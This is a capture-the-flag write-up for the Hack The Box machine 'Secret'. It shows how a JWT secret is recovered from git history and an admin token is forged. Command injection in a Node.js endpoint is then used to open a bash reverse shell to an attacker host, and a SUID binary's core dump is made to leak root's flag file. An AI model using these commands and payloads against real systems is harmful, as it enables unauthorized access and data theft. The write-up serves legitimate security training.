# Target
| Category          | Details                                                               |
|-------------------|-----------------------------------------------------------------------|
| 📝 **Name**       | [Secret](https://app.hackthebox.com/machines/Secret)                  |  
| 🏷 **Type**       | HTB Machine                                                           |
| 🖥 **OS**         | Linux                                                                 |
| 🎯 **Difficulty** | Easy                                                                  |
| 📁 **Tags**       | JWT tampering, command injection, prctl(PR_SET_DUMPABLE, 1) core dump |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-17 17:34 +0200
Nmap scan report for 10.129.29.180
Host is up (0.044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
```

#### Enumerate web server running at port 80
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ feroxbuster --url http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
200      GET    16136l    98185w  4194304c http://10.129.29.180/download/files.zip (truncated to size limit)
<SNIP>
```

#### Download discovered `/download/files.zip` archive
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ wget -q  http://$TARGET/download/files.zip
```
`files.zip` seems to hold code of node.js application running on target on port 3000.

#### Discover command injection vulnerability
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ cat -n local-web/routes/private.js
<SNIP>
    32  router.get('/logs', verifytoken, (req, res) => {
    33      const file = req.query.file;
    34      const userinfo = { name: req.user }
    35      const name = userinfo.name.name;
    36      
    37      if (name == 'theadmin'){
    38          const getLogs = `git log --oneline ${file}`;
    39          exec(getLogs, (err , output) =>{
    40              if(err){
    41                  res.status(500).send(err);
    42                  return
    43              }
    44              res.json(output);
    45          })
    46      }
    47      else{
    48          res.json({
    49              role: {
    50                  role: "you are normal user",
    51                  desc: userinfo.name.name
    52              }
    53          })
    54      }
    55  })
<SNIP>
```
Vulnerability sits in line 38, as we fully control `${file}` we could use it to inject command. There is one additional condition the name of user must be `theadmin`.

#### Register user with name `theadmin`
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ curl http://$TARGET:3000/api/user/register -H "Content-Type: application/json" -d '{"email":"john.doe@server.com","name":"theadmin","password":"pass123!"}'
Name already Exist
```
Since `theadmin` user already exists, we will pivot to JWT token tampering.

#### Check git history
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret/local-web]
└─$ git log --oneline                            
67d8da7 (HEAD) removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit
```
`67d8da7` seems to have particularly interesting commit message

#### Check changes introduced in `67d8da7` commit
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret/local-web]
└─$ git show 67d8da7 
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 (HEAD)
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```
We have discovered JWT secret, we could use it to tamper JWT.

#### Register new user
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ curl http://$TARGET:3000/api/user/register -H "Content-Type: application/json" -d '{"email":"john.doe@server.com","name":"johndoe","password":"pass123!"}'
{"user":"johndoe"}
```

#### Login as `johndoe` to obtain JWT
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ curl http://$TARGET/api/user/login -H "Content-Type: application/json" -d '{"email":"john.doe@server.com","password":"pass123!"}'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OWU3MDJlZTU4NjVjNDA0NzQ4NGM3MTAiLCJuYW1lIjoiam9obmRvZSIsImVtYWlsIjoiam9obi5kb2VAc2VydmVyLmNvbSIsImlhdCI6MTc3Njc4NTU5N30.Yqe4dnyk1KMYNkQ1BOKCHhkc6QinFyuEc4JF0sc35XM
```

#### Use discovered secret to tamper `name` in JWT for user `johndoe`
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ source ~/Tools/JWT/jwt_tool/.venv/bin/activate && /
python3 ~/Tools/JWT/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OWU3MDJlZTU4NjVjNDA0NzQ4NGM3MTAiLCJuYW1lIjoiam9obmRvZSIsImVtYWlsIjoiam9obi5kb2VAc2VydmVyLmNvbSIsImlhdCI6MTc3Njc4NTU5N30.Yqe4dnyk1KMYNkQ1BOKCHhkc6QinFyuEc4JF0sc35XM -p gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE -S hs256 -T
<SNIP>
Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] _id = "69e702ee5865c4047484c710"
[2] name = "johndoe"
[3] email = "john.doe@server.com"
[4] iat = 1776785597    ==> TIMESTAMP = 2026-04-21 17:33:17 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5
Please enter new Key and hit ENTER
> name
Please enter new value for name and hit ENTER
> theadmin
[1] _id = "69e702ee5865c4047484c710"
[2] name = "theadmin"
[3] email = "john.doe@server.com"
[4] iat = 1776785597    ==> TIMESTAMP = 2026-04-21 17:33:17 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                       
(or 0 to Continue)                                                                                                                                                                                  
> 7
Timestamp updating:
[1] Update earliest timestamp to current time (keeping offsets)
[2] Add 1 hour to timestamps
[3] Add 1 day to timestamps
[4] Remove 1 hour from timestamps
[5] Remove 1 day from timestamps

Please select an option from above (1-5):                                                                                                                                                           
> 3
[1] _id = "69e702ee5865c4047484c710"
[2] name = "theadmin"
[3] email = "john.doe@server.com"
[4] iat = 1776871997    ==> TIMESTAMP = 2026-04-22 17:33:17 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                       
(or 0 to Continue)                                                                                                                                                                                  
> 0
jwttool_41ec30129c35bcc1dbf611280d04d6b0 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OWU3MDJlZTU4NjVjNDA0NzQ4NGM3MTAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImpvaG4uZG9lQHNlcnZlci5jb20iLCJpYXQiOjE3NzY4NzE5OTd9._Co_3cIMF0D9RYQlpSoSbTcKmHD7s3mQl4FkDabBnoY
```

#### Confirm tampered token is correct
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ curl http://$TARGET/api/priv -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OWU3MDJlZTU4NjVjNDA0NzQ4NGM3MTAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImpvaG4uZG9lQHNlcnZlci5jb20iLCJpYXQiOjE3NzY4NzE5OTd9._Co_3cIMF0D9RYQlpSoSbTcKmHD7s3mQl4FkDabBnoY"
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}} 
```

#### Confirm command injection vulnerability
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ curl "http://$TARGET/api/logs?file=;id" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OWU3MDJlZTU4NjVjNDA0NzQ4NGM3MTAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImpvaG4uZG9lQHNlcnZlci5jb20iLCJpYXQiOjE3NzY4NzE5OTd9._Co_3cIMF0D9RYQlpSoSbTcKmHD7s3mQl4FkDabBnoY"
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret/local-web]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Exploit command injection vulnerability to spawn reverse shell connection
```
CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" | jq -sRr @uri) && \
curl "http://$TARGET/api/logs?file=;$CMD" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OWU3MDJlZTU4NjVjNDA0NzQ4NGM3MTAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImpvaG4uZG9lQHNlcnZlci5jb20iLCJpYXQiOjE3NzY4NzE5OTd9._Co_3cIMF0D9RYQlpSoSbTcKmHD7s3mQl4FkDabBnoY"
```

#### Confirm foothold gained
```
connect to [10.10.16.193] from (UNKNOWN) [10.129.31.176] 46684
bash: cannot set terminal process group (1140): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

#### Capture user flag
```
dasith@secret:~$ cat /home/dasith/user.txt 
b130b450d2aabfd54d48e46c7ac3e249
```

### Root flag

#### Upgrade connection to SSH using authorized public key
```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ ssh-keygen -q -t rsa -b 1024 -f id_rsa -N "" -C "$RANDOM@$RANDOM.net" && cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDbO4rCyyky8QGwo0OrHOk6NidBbTc9pq3QOmKgS5ncdHNBQ6asnZOPa6ZyA6Et2INcl/XcMoOqq+WFSg4i62pZXYLsT9N0n3zE3UxV3NE7QtzGvSp/cnK0XHcvGX9RMrB6hgoS39MioniMXQJoS3Au1XKecMAxMu2uMm0IdZlu8w== 14730@15167.net
```

```
dasith@secret:~$ USER_NAME=dasith && \
PUBLIC_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDbO4rCyyky8QGwo0OrHOk6NidBbTc9pq3QOmKgS5ncdHNBQ6asnZOPa6ZyA6Et2INcl/XcMoOqq+WFSg4i62pZXYLsT9N0n3zE3UxV3NE7QtzGvSp/cnK0XHcvGX9RMrB6hgoS39MioniMXQJoS3Au1XKecMAxMu2uMm0IdZlu8w== 14730@15167.net' && \
mkdir /home/$USER_NAME/.ssh && \
chmod 700 /home/$USER_NAME/.ssh && \
echo $PUBLIC_KEY > /home/$USER_NAME/.ssh/authorized_keys && \
chmod 600 /home/$USER_NAME/.ssh/authorized_keys
```

```
┌──(magicrc㉿perun)-[~/attack/HTB Secret]
└─$ ssh -i id_rsa dasith@$TARGET
<SNIP>
dasith@secret:~$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

#### Discover `/opt/count` SUID binary
Binary discovered with `linpeas`
```
dasith@secret:~$ ls -la /opt/count 
-rwsr-xr-x 1 root root 17824 Oct  7  2021 /opt/count
```
This binary comes with sources code `count.c` file. We could use to search for vulnerabilities we could exploit.

#### Analyze binary code
```
dasith@secret:~$ cat -n /opt/code.c
<SNIP>
    72  void filecount(const char *path, char *summary)
    73  {
    74      FILE *file;
    75      char ch;
    76      int characters, words, lines;
    77
    78      file = fopen(path, "r");
    79
    80      if (file == NULL)
    81      {
    82          printf("\nUnable to open file.\n");
    83          printf("Please check if file exists and you have read privilege.\n");
    84          exit(EXIT_FAILURE);
    85      }
    86
    87      characters = words = lines = 0;
    88      while ((ch = fgetc(file)) != EOF)
    89      {
    90          characters++;
    91          if (ch == '\n' || ch == '\0')
    92              lines++;
    93          if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
    94              words++;
    95      }
    96
    97      if (characters > 0)
    98      {
    99          words++;
   100          lines++;
   101      }
   102
   103      snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
   104      printf("\n%s", summary);
   105  }
   106
   107
   108  int main()
   109  {
   110      char path[100];
   111      int res;
   112      struct stat path_s;
   113      char summary[4096];
   114
   115      printf("Enter source file/directory name: ");
   116      scanf("%99s", path);
   117      getchar();
   118      stat(path, &path_s);
   119      if(S_ISDIR(path_s.st_mode))
   120          dircount(path, summary);
   121      else
   122          filecount(path, summary);
   123
   124      // drop privs to limit file write
   125      setuid(getuid());
   126      // Enable coredump generation
   127      prctl(PR_SET_DUMPABLE, 1);
   128      printf("Save results a file? [y/N]: ");
   129      res = getchar();
<SNIP>
```
There are no obvious vulnerabilities here (like buffer overflow or command injection), however in line 127 core dumping is enabled. Additionally, if input `path` (provided in line 116) would be a file, this file will be loaded into memory with `fopen` (in line 78). If we could send `SIGSEGV` to this process before it ends, core containing selected file will be dumped. Since program will wait for user input in line 129, we do not need to 'race' to send signal.

#### Start `/opt/count` and use to load `/root/root.txt`
```
dasith@secret:~$ /opt/count 
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: 
```

#### Send `SIGSEGV` to `/opt/count` using second SSH connection
```
dasith@secret:~$ pgrep -a count
791 /usr/lib/accountsservice/accounts-daemon
1602 /opt/count
dasith@secret:~$ kill -SIGSEGV 1602
```

#### List `apport` crashes directory
```
dasith@secret:~$ ls -la /var/crash
total 88
drwxrwxrwt  2 root   root    4096 Apr 22 05:07 .
drwxr-xr-x 14 root   root    4096 Aug 13  2021 ..
-rw-r-----  1 root   root   27203 Oct  6  2021 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28028 Apr 22 05:07 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5  2021 _opt_countzz.0.crash
```

#### Captrue root flag from dumped core
```
apport-unpack /var/crash/_opt_count.1000.crash /tmp/core_dump && \
strings /tmp/core_dump/CoreDump | grep -A 2 -B 2 root.txt
Save results a file? [y/N]: words      = 2
Total lines      = 2
/root/root.txt
bc95e6036f1e329468ed034b724cf5c7
aliases
--
ory name: 
%99s
/root/root.txt
Total characters = 33
Total words      = 2
```
